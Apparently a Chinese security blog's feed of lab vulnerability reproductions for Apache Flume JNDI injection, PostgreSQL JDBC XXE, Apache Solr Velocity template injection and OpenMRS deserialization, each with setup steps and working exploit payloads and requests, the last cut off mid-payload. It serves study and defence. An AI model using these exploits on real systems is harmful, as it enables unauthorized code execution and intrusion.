DriverManager.getConnection(&quot;jdbc:postgresql://10.58.120.200:5432/testdb?user=postgres&amp;password=postgres&quot;);        <span class="hljs-keyword">Statement</span> <span class="hljs-keyword">statement</span> = <span class="hljs-keyword">connection</span>.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;connect database successfully&quot;);        ResultSet resultSet = <span class="hljs-keyword">statement</span>.executeQuery(&quot;select * from refresh_row_example&quot;);        resultSet.next();        resultSet.refreshRow();        <span class="hljs-keyword">statement</span>.<span class="hljs-keyword">close</span>();        <span class="hljs-keyword">connection</span>.<span class="hljs-keyword">close</span>();    &#125;&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304151639393.png"> </p><p>查看postgresql的testdb数据库下成功创建test表</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304151717011.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache Flume JNDI远程命令执行漏洞-CVE-2022-25167</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/flume-cve-2022-25167/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/flume-cve-2022-25167/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>测试环境</p><p>Java：jdk1.8.0_65</p><p>Apache ActiveMQ：5.14.0</p><p>Apache Flume：1.10.0</p><p><strong>软件下载</strong></p><p><strong>java</strong></p><p>Apache ActiveMQ</p><p><a href="http://archive.apache.org/dist/activemq/5.14.1/apache-activemq-5.14.1-bin.tar.gz">http://archive.apache.org/dist/activemq/5.14.1/apache-activemq-5.14.1-bin.tar.gz</a></p><h2 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h2><p>jdk8u65</p><h2 id="安装Apache-ActiveMQ"><a href="#安装Apache-ActiveMQ" class="headerlink" title="安装Apache ActiveMQ"></a>安装Apache ActiveMQ</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment">#安装</span><span class="hljs-attribute">tar</span> -xf apache-activemq-<span class="hljs-number">5</span>.<span class="hljs-number">14</span>.<span class="hljs-number">1</span>-bin.tar.gz<span class="hljs-comment">#启动</span><span class="hljs-attribute">bash</span> /root/apache-activemq-<span class="hljs-number">5</span>.<span class="hljs-number">14</span>.<span class="hljs-number">1</span>/bin/activemq start</code></pre></div><h2 id="安装Apache-Flume"><a href="#安装Apache-Flume" class="headerlink" title="安装Apache Flume"></a>安装Apache Flume</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -xf apache-flume-<span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">0</span>-bin.tar.gz</code></pre></div><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>Apache Flume是美国阿帕奇（Apache）基金会的一种分布式、可靠且可用的服务。用于高效收集、聚合和移动大量日志数据。</p><p>Apache Flume 1.4.0版本至1.9.0之前版本存在安全漏洞，该漏洞源于配置使用带有 JNDI LDAP 数据源 URI 的 JMS 源导致容易受到远程代码执行 (RCE) 攻击。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>Apache Flume &gt;&#x3D;1.4.0</p><p>Apache Flume &lt;&#x3D;1.9.0</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>启动恶意JNDI服务：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C touch /tmp/success -A <span class="hljs-number">10.58.120.200</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240307175900516.png"></p><p>创建恶意配置文件 </p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /root/apache-flume-<span class="hljs-number">1.9</span>.<span class="hljs-number">0</span>-bin/<span class="hljs-keyword">conf</span>/<span class="hljs-built_in">exp</span>.logger.<span class="hljs-keyword">conf</span></code></pre></div><p>将<code>a1.sources.r1.providerURL</code>处替换LDAP链接前部分，<code>a1.sources.r1.connectionFactory</code>替换为LDAP连接后部分</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">a1.sources</span> = r1<span class="hljs-attr">a1.channels</span> = c1<span class="hljs-attr">a1.sinks</span>=k1<span class="hljs-attr">a1.sources.r1.type</span> = jms<span class="hljs-attr">a1.sources.r1.channels</span> = c1<span class="hljs-attr">a1.sources.r1.initialContextFactory</span> = com.sun.jndi.ldap.LdapCtxFactory<span class="hljs-attr">a1.sources.r1.connectionFactory</span> = qrdv1f<span class="hljs-attr">a1.sources.r1.providerURL</span> = ldap://<span class="hljs-number">10.58</span>.<span class="hljs-number">120.200</span>:<span class="hljs-number">1389</span><span class="hljs-attr">a1.sources.r1.destinationName</span> = BUSINESS_DATA<span class="hljs-attr">a1.sources.r1.destinationType</span> = QUEUE<span class="hljs-attr">a1.sinks.k1.type</span> = logger<span class="hljs-comment"># Use a channel which buffers events in memory</span><span class="hljs-attr">a1.channels.c1.type</span> = memory<span class="hljs-attr">a1.channels.c1.capacity</span> = <span class="hljs-number">1000</span><span class="hljs-attr">a1.channels.c1.transactionCapacity</span> = <span class="hljs-number">100</span></code></pre></div><p>运行</p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /root/apache-flume-<span class="hljs-number">1.9</span>.<span class="hljs-number">0</span>-binbash bin/flume-ng agent --<span class="hljs-keyword">conf</span> <span class="hljs-keyword">conf</span> --<span class="hljs-keyword">conf</span>-<span class="hljs-keyword">file</span> <span class="hljs-keyword">conf</span>/<span class="hljs-built_in">exp</span>.logger.<span class="hljs-keyword">conf</span> --name a1</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240307180353564.png"> </p><p>JNDI服务接收到请求</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240307180310734.png"> </p><p>服务器成功执行命令</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240307180423812.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PostgreSQL JDBC Driver 外部实体注入漏洞-CVE-2020-13692</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/postgresql-jdbc-cve-2020-13692/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/postgresql-jdbc-cve-2020-13692/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装PostgreSQL"><a href="#安装PostgreSQL" class="headerlink" title="安装PostgreSQL"></a>安装PostgreSQL</h2><p><a href="https://www.postgresql.org/download/linux/redhat/">https://www.postgresql.org/download/linux/redhat/</a></p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> yum install -y https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm<span class="hljs-built_in">sudo</span> yum install -y postgresql15-server<span class="hljs-built_in">sudo</span> /usr/pgsql-15/bin/postgresql-15-setup initdb<span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> postgresql-15<span class="hljs-built_in">sudo</span> systemctl start postgresql-15</code></pre></div><p>配置</p><div class="code-wrapper"><pre><code class="hljs pgsql">#修改监听地址vim /var/lib/pgsql/<span class="hljs-number">15</span>/data/postgresql.conflisten_addresses = <span class="hljs-string">&#x27;*&#x27;</span>#修改可访问地址vim /var/lib/pgsql/<span class="hljs-number">15</span>/data/pg_hba.confhost    <span class="hljs-keyword">all</span>             <span class="hljs-keyword">all</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span>            scram-sha<span class="hljs-number">-256</span>#重启服务systemctl <span class="hljs-keyword">restart</span> postgresql<span class="hljs-number">-15</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304115108284.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304115034157.png"> </p><p>创建数据库和用户</p><div class="code-wrapper"><pre><code class="hljs pgsql">#安装postgresql后默认创建一个postgres用户，切换到postgres用户su postgres#进入postgresql数据库psql#修改postgresql用户密码<span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> postgres <span class="hljs-keyword">with</span> <span class="hljs-keyword">password</span> <span class="hljs-string">&#x27;postgres&#x27;</span>;#创建数据库<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> testdb;#创建用户<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> jowto <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">PASSWORD</span> <span class="hljs-string">&#x27;123456&#x27;</span>;#授权数据库给用户<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DATABASE</span> testdb <span class="hljs-keyword">TO</span> jowto;</code></pre></div><h2 id="Idea生成测试代码"><a href="#Idea生成测试代码" class="headerlink" title="Idea生成测试代码"></a>Idea生成测试代码</h2><p>过程略</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment">#启动</span><span class="hljs-attribute">java</span> -jar postgresql-cve-<span class="hljs-number">2020</span>-<span class="hljs-number">13692</span>.jar</code></pre></div><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>42.2.13 之前的 PostgreSQL JDBC 驱动程序（又名 PgJDBC）允许 XXE。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>PostgreSQL JDBC &lt; 42.2.13</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>使用Yatkit工具生成一个dnslog域名：nlehvgogej.dgrh3.cn</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304142941700.png"> </p><p>payload</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://nlehvgogej.dgrh3.cn&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>&quot;;</code></pre></div><p>将payload进行base64编码，再加编码后的+号替换为-号</p><div class="code-wrapper"><pre><code class="hljs fix"><span class="hljs-attr">替换+号前：</span><span class="hljs-attr">PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPgo8IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbmxlaHZnb2dlai5kZ3JoMy5jbiI+XT48Zm9vPiZ4eGU7PC9mb28+Ijs</span>=<span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">替换+号后：</span><span class="hljs-string">PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPgo8IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbmxlaHZnb2dlai5kZ3JoMy5jbiI-XT48Zm9vPiZ4eGU7PC9mb28-Ijs=</span></code></pre></div><p>发送</p><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//10.58.120.200:8080/test?base64String=PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPgo8IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbmxlaHZnb2dlai5kZ3JoMy5jbiI-XT48Zm9vPiZ4eGU7PC9mb28-Ijs=</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304143221539.png"> </p><p>观察Yatkit工具成功接收到dns请求</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304143246606.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache Solr Velocity模板注入漏洞-CVE-2019-17558</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/solr-cve-2019-17558/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/solr-cve-2019-17558/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>软件列表</strong></p><p>Linux、Java、Apache Solr</p><p><strong>软件版本</strong></p><p>Linux：CentOS Linux release 7.7.1908 (Core)</p><p>Java：jdk1.8.0_65</p><p>Apache Solr：8.2.0</p><p><strong>软件下载</strong></p><p><strong>java</strong></p><p><strong>apache solr</strong></p><p><a href="https://archive.apache.org/dist/lucene/solr/8.2.0/solr-8.2.0.zip">https://archive.apache.org/dist/lucene/solr/8.2.0/solr-8.2.0.zip</a></p><h2 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h2><p>略</p><h2 id="安装Apache-Solr"><a href="#安装Apache-Solr" class="headerlink" title="安装Apache Solr"></a>安装Apache Solr</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment">#解压安装</span><span class="hljs-attribute">unzip</span> solr-<span class="hljs-number">8</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.zip<span class="hljs-comment">#启动</span><span class="hljs-attribute">bash</span> /root/solr-<span class="hljs-number">8</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/bin/solr -s <span class="hljs-string">&quot;/root/solr-8.2.0/example/example-DIH/solr&quot;</span> -force</code></pre></div><p><strong>配置JVM参数</strong></p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> /root/solr-<span class="hljs-number">8</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/bin/solr -a <span class="hljs-string">&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8888&quot;</span> -s <span class="hljs-string">&quot;/root/solr-8.2.0/example/example-DIH/solr&quot;</span> -force</code></pre></div><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><a href="http://10.58.120.200:8983/solr">http://10.58.120.200:8983/solr</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240229180050080.png"> </p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>Apache Solr是美国阿帕奇（Apache）基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器。该产品支持层面搜索、垂直搜索、高亮显示搜索结果等。</p><p>Apache Solr 5.0.0版本至8.3.1版本中存在注入漏洞。攻击者可借助Velocity模板利用该漏洞在系统上执行任意代码。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>Apache Solr &gt; 5.0.0 </p><p>Apache Solr &lt; 8.3.1 </p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>访问<a href="http://10.58.120.200:8983/solr/db/config">http://10.58.120.200:8983/solr/db/config</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240229180158541.png"> </p><p>修改配置</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/solr/db/config</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.200:8983<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>259<span class="language-n1ql">&#123;</span><span class="language-n1ql">  &quot;<span class="hljs-keyword">update</span>-queryresponsewriter<span class="hljs-string">&quot;: &#123;</span></span><span class="hljs-string"><span class="language-n1ql">    &quot;</span>startup<span class="hljs-string">&quot;: &quot;</span>lazy<span class="hljs-string">&quot;,</span></span><span class="hljs-string"><span class="language-n1ql">    &quot;</span>name<span class="hljs-string">&quot;: &quot;</span>velocity<span class="hljs-string">&quot;,</span></span><span class="hljs-string"><span class="language-n1ql">    &quot;</span>class<span class="hljs-string">&quot;: &quot;</span>solr.VelocityResponseWriter<span class="hljs-string">&quot;,</span></span><span class="hljs-string"><span class="language-n1ql">    &quot;</span>template.base.dir<span class="hljs-string">&quot;: &quot;</span><span class="hljs-string">&quot;,</span></span><span class="hljs-string"><span class="language-n1ql">    &quot;</span>solr.resource.loader.enabled<span class="hljs-string">&quot;: &quot;</span><span class="hljs-literal">true</span><span class="hljs-string">&quot;,</span></span><span class="hljs-string"><span class="language-n1ql">    &quot;</span>params.resource.loader.enabled<span class="hljs-string">&quot;: &quot;</span><span class="hljs-literal">true</span><span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="language-n1ql">  &#125;</span></span><span class="hljs-string"><span class="language-n1ql">&#125;</span></span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240229180410246.png"> </p><p>执行命令</p><div class="code-wrapper"><pre><code class="hljs xquery">http://<span class="hljs-number">10.58</span>.<span class="hljs-number">120.200</span>:<span class="hljs-number">8983</span>/solr/db/select?q=<span class="hljs-number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$x</span>=<span class="hljs-meta">%27</span><span class="hljs-meta">%27</span>)+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$rt</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.Runtime<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$chr</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.Character<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$str</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.String<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$ex</span>=<span class="hljs-variable">$rt</span>.getRuntime().exec(<span class="hljs-meta">%27id</span><span class="hljs-meta">%27</span>))+<span class="hljs-variable">$ex</span>.waitFor()+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$out</span>=<span class="hljs-variable">$ex</span>.getInputStream())+<span class="hljs-meta">%23foreach</span>(<span class="hljs-variable">$i</span>+<span class="hljs-keyword">in</span>+[<span class="hljs-number">1</span>..<span class="hljs-variable">$out</span>.available()])<span class="hljs-variable">$str</span>.valueOf(<span class="hljs-variable">$chr</span>.toChars(<span class="hljs-variable">$out</span>.read()))<span class="hljs-meta">%23end</span></code></pre></div><p> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240229180806055.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OpenMRS反序列命令执行漏洞-CVE-2018-19276</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OpenMRS-cve-2018-19276/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OpenMRS-cve-2018-19276/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>软件列表</strong></p><p>Linux、Java、OpenMRS</p><p><strong>软件版本</strong></p><p>Linux：CentOS Linux release 7.7.1908 (Core)</p><p>Java：jdk1.8.0_65</p><p>OpenMRS：2.1.3</p><p><strong>软件下载</strong></p><p>java</p><p>OpenMRS</p><p><a href="https://master.dl.sourceforge.net/project/openmrs/releases/OpenMRS_Platform_2.1.3/openmrs.war?viasf=1">https://master.dl.sourceforge.net/project/openmrs/releases/OpenMRS_Platform_2.1.3/openmrs.war?viasf=1</a></p><h2 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h2><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><h2 id="安装OpenMRS"><a href="#安装OpenMRS" class="headerlink" title="安装OpenMRS"></a>安装OpenMRS</h2><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#安装tomcat</span>tar -xf apache-tomcat-<span class="hljs-number">8.5</span>.<span class="hljs-number">0</span>.tar.gz -C <span class="hljs-regexp">/usr/</span>local/mv <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache-tomcat-8.5.0 /u</span>sr<span class="hljs-regexp">/local/</span>tomcat<span class="hljs-comment">#</span>将openmrs.war放在<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/tomcat/</span>webapps/<span class="hljs-comment">#启动tomcat</span>bash <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/tomcat/</span>bin/startup.sh</code></pre></div><h2 id="初始化OpenMRS"><a href="#初始化OpenMRS" class="headerlink" title="初始化OpenMRS"></a>初始化OpenMRS</h2><p><a href="http://10.41.230.69:8080/openmrs/initialsetup">http://10.41.230.69:8080/openmrs/initialsetup</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230308110522087.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230308110538005.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230308110601846.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230308110618366.png"></p><p>等待配置数据库</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230308110649344.png"></p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><a href="http://10.41.230.69:8080/openmrs/index.htm">http://10.41.230.69:8080/openmrs/index.htm</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230308114715873.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>OpenMRS是美国OpenMRS公司的一套开源的电子病历系统。</p><p>OpenMRS Platform 2.24.0 之前的 OpenMRS 受到不安全对象反序列化漏洞的影响，该漏洞允许未经身份验证的用户通过请求正文中精心制作的 XML 数据在目标系统上执行任意命令。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>OpenMRS &lt; 2.24.0</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>发送请求，在服务器上执行<code>touch /tmp/success</code>命令</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/openmrs/ws/rest/v1/patient</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.41.230.69:8080<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>2392<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span></span><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span></span><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><span class="language-xml">     <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span></span><span class="language-xml">     <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><span class="language-xml">       <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span></span><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><span class="language-xml">           <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><span class="language-xml">             <span class="hljs-tag">&lt;<span class="hljs-name">cipher</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><span class="language-xml">               <span class="hljs-tag">&lt;<span class="hljs-name">initialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">initialized</span>&gt;</span></span><span class="language-xml">               <span class="hljs-tag">&lt;<span class="hljs-name">opmode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">opmode</span>&gt;</span></span><span class="language-xml">               <span class="hljs-tag">&lt;<span class="hljs-name">serviceIterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><span class="language-xml">                 <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><span class="language-xml">                   <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span></span><span class="language-xml">                   <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span></span><span class="language-xml">                       <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>touch<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><span class="language-xml">                       <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/tmp/success<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><span class="language-xml">                     <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span></span><span class="language-xml">                     <span class="hljs-tag">&lt;<span class="hljs-name">redirectErrorStream</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">redirectErrorStream</span>&gt;</span></span><span class="language-xml">                   <span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span></span><span 